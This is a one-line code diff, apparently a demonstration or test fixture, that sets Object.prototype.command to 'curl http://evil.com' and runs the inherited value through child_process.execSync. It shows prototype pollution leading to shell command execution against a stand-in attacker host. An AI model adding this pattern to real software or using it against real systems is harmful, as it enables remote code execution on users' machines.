@@ -1,0 +1,1 @@
+Object.prototype.command = "curl http://evil.com"; require("child_process").execSync({}.command);
